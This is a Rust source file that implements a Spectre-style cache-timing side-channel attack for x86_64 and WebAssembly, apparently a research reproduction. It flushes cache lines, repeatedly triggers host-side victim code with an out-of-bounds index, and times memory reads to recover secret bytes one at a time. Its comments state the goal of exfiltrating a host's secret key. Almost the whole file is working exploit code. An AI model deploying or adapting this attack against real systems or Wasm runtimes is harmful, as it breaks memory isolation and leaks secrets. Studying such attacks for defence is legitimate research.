#![feature(asm_experimental_arch)]

use reproduction::*;
use std::arch::asm;
#[cfg(all(target_arch = "x86_64"))]
use std::arch::x86_64::_mm_clflush;
#[cfg(all(target_arch = "x86_64"))]
use std::arch::x86_64::_mm_mfence;
#[cfg(all(target_arch = "x86_64"))]
use crate::_rdtsc;
use std::io::Write;

// In case of wasm target, then this is imported from the host
// Set the host name as wasi
#[cfg(all(target_arch = "wasm32"))]
extern "C" {
    fn _rdtsc() -> u64;
    fn _mm_clflush(ptr: *const u8);
    fn _mm_mfence();
    fn _mm_lfence();
    fn finish();

    // Pseudo victim code
    fn victim_code(index: u32);

    // TODO another Wasm code
    // fn sync_in_sibling()
}

const secret_data: &str = "xxxxxxxxxxx";
const data_size: usize = 16;
/* Set the public data */
const public_data: [u8; 17] = [ 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16, 83/* S */ ];
const _pad: [u8; 64] = [1; 64];
const array_for_prediction: [u8; 256 * STRIDE] = [0; 256 * STRIDE];

// To avoid optimization of the victim code
static mut tmp: u8 = 0;

// Returns the best two indexes and the best two values
#[no_mangle]
#[allow(dead_code)]
fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64; 2]) {
    let mut latencies = [0; 256];
    let mut scores = [0u64; 256];

    let mut max1: i32 = -1;
    let mut max2: i32 = -1;

    let mut score = [0u64; 2];
    let mut value = [0u64; 2];

    // Set up the latencies and the scores to 0
    for i in 0..256 {
        scores[i] = 0;
    }
    let tries = std::env::var("TRIES").unwrap_or("100000".to_string());
    let tries = tries.parse::<u64>().unwrap();
    unsafe {
        _mm_mfence();
    }

    for i in 0..tries {
        for j in 0..256 {
            unsafe {
                _mm_mfence();
            }

            #[cfg(all(target_arch = "x86_64"))]
            unsafe {
                _mm_clflush(&array_for_prediction[j * STRIDE] as *const u8);
            }
            #[cfg(all(target_arch = "wasm32"))]
            unsafe {
                // We flush the guest memory in the host space
                _mm_clflush((j * STRIDE) as *const u8);
            }
        }
        // Wait a little to the cache to flush
        for _ in 0..10000 {}
        unsafe {
            _mm_mfence();
        }

        // This makes the predictor to traing in the host. The host uses its data to access the memory of this
        // binary. The idea is to exfiltrate the data used by the host as it is a secret key for example.
        // Here we access the line to measure the threshold of the cache hit
        #[cfg(all(target_arch = "wasm32"))]
        for j in 0..20 {
            // Call the victim code outside this binary
            // This attacker just use eviction
            unsafe {
                victim_code(malicious_x as u32);
            }

        }
        // #[cfg(feature = "tracing")]
        // println!("Measuring time now");
        for j in 0..256 {
            // To avoid stride caching
            let mix_i = ((j * 167) + 13) & 255;

            let addr = &array_for_prediction[mix_i * STRIDE as usize] as *const u8;
            //#[cfg(feature = "tracing")]
            //println!("Mem {:?}", addr);
            // Read the mem addr
            let end = unsafe {
                let start = _rdtsc();
                tmp &= read_memory_offset(addr);
                _rdtsc() - start
            };
            // There are two values to see, the real access and the fake access
            if end <= (90 * hit + 10 * miss) / 100{
                scores[mix_i] += 1;
            }
        }

        for j in 0..256 {
            // Get the best and the second best
            if max1 < 0 || scores[j] >= scores[max1 as usize] {
                max2 = max1;
                max1 = j as i32;
            } else if max2 < 0 || (scores[j] >= scores[max2 as usize]) {
                max2 = j as i32;
            }
        }
        // patch from https://github.com/ikemmm/rust-spectre/blob/55a034a5272ff8644b09c3ad203fc6df7e80c5fd/src/main.rs#L260
        // Swap max1 and max2 if the max1 is 0x00
        if max1 as u8 == 0x00 {
            let tmp1 = max1;
            max1 = max2;
            max2 = tmp1;
        }

        score[0] = scores[max1 as usize];
        score[1] = scores[max2 as usize];

        value[0] = max1 as u64;
        value[1] = max2 as u64;
    }

    #[cfg(feature = "tracing")]
    {
        eprintln!("scores = [");
        for l in scores {
            eprint!("{},", l);
        }
        eprintln!("]");
    }

    // For some reason we need a time delay here
    for _ in 0..10000 {}

    (score, value)
}

#[no_mangle]
pub fn predict(pad: usize) {

    let (hit, miss) = reproduction::get_cache_time(&array_for_prediction, 10000000);
    println!("Hit {} Miss {}", hit, miss);

    for j in 0..11 {
        // let (hit, miss) = reproduction::get_cache_time(&array_for_prediction, 1000000);
        // #[cfg(feature = "tracing")]
        
        let (score, value) = read_memory_byte(j, hit, miss);
        // get value 0 as char
        let ch = value[0] as u8 as char;
        let ch2 = value[1] as u8 as char;

        #[cfg(feature = "tracing")]
        println!(
            // The value as char
            "Reading at malicious_x {} = {}:{}:{} (second {} {} {})",
            j, ch, value[0], score[0], ch2, value[1], score[1]
        );

        #[cfg(not(feature = "tracing"))]
        print!("{}({:x})", ch, ch as u8);
        std::io::stdout().flush().unwrap();
    }
}

pub fn main() {
    // Filling up public data
    
    

    eprintln!("Starting attack");
    predict(0);

    unsafe {
        finish();
    }

}
